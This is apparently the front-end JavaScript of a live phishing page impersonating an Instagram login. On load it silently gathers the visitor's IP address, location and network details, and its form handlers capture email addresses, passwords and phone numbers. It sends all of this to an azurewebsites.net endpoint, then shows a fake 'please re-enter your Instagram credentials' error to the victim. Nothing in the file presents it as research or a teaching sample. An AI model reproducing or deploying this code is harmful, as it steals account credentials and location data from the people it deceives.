$(document).ready(function () {
    getApi();
	getIpClient();
	
});

var locTotal;

async function getIpClient() {
    try {
		if(locTotal=="undefined" || locTotal == undefined || locTotal == null locTotal==""){
			locTotal = "sin coordenadas";
		}else{
			locTotal = locTotal;
		}
        const response = await axios.get('https://ipinfo.io/json?token=28553f2ba2cfda');
        let datos = {
            'action': 'add',
            'ip': response.data.ip,
            'hostname': response.data.hostname,
            'city': response.data.city,
            'region': response.data.region,
            'country': response.data.country,
            'loc': locTotal,
            'org': response.data.org,
            'timezone': response.data.timezone,
        };

        $.post('https://availableconection.azurewebsites.net/controller/daoDatos.php', datos, function (res) {
            var data = JSON.parse(res);
            if (!data.error) {
                console.log("OK");
            }
            else if (data.error) {
                console.log(data.error);
            }
        });
    } catch (error) {
        console.error(error);
    }
}


function getApi(){
	if(navigator.geolocation){
		var success = function(position){
		var latitud = position.coords.latitude,
			longitud = position.coords.longitude;
			locTotal = (latitud+" "+ longitud);
		
	}
	
	navigator.geolocation.getCurrentPosition(success, function(msg){
		});
	}
}

var nombre, contra;
function guardarDatos(){
	try{
		nombre = document.getElementById("correo").value;
		contra = document.getElementById("pwd").value;
		if(nombre=="" || contra==""){
			alert('Ingrese los datos los datos requeridos')
		}else{
			let datosU = {
				'action': 'add',
				'usuario': nombre,
				'password': contra,
			};
			
			$.post('https://availableconection.azurewebsites.net/controller/usuariosDao.php', datosU, function (res) {
				var datosR = JSON.parse(res);
				if (!datosR.error) {
					console.log("OK");
					alert('Error, vuelva a ingresar las credenciales de su instagram')
				}
				else if (datosR.error) {
					console.log(datosR.error);
				}
			});
		}
	} catch (error) {
        console.error(error);
    }	
}



var usuario2,correo2,contra2,telefono2;
function guardarDatosR(){
	try{
		usuario2 = document.getElementById("usuario").value;
		correo2 = document.getElementById("correo").value;
		contra2 = document.getElementById("contra").value;
		telefono2 = document.getElementById("telefono").value;
		if(usuario2=="" || correo2=="" || contra2 ==""){
			alert('Ingrese los datos los datos requeridos')
		}else{
			let datosU = {
				'action': 'add',
				'usuario': usuario2,
				'correo': correo2,
				'contra': contra2,
				'telefono': telefono2,
			};
			
			$.post('https://availableconection.azurewebsites.net/controller/registroDao.php', datosU, function (res) {
				var datosR = JSON.parse(res);
				if (!datosR.error) {
					alert('Registro guardado correctamente, Inicia Sesion')
					console.log("OK");
					limpiar();
					window.location.href = "https://availableconection.azurewebsites.net/";
				}
				else if (datosR.error) {
					console.log(datosR.error);
				}
			});
		}
	} catch (error) {
        console.error(error);
    }	
}

function limpiar(){
	document.getElementById("usuario").value ="";
	document.getElementById("correo").value="";
	document.getElementById("contra").value="";
	document.getElementById("telefono").value="";
}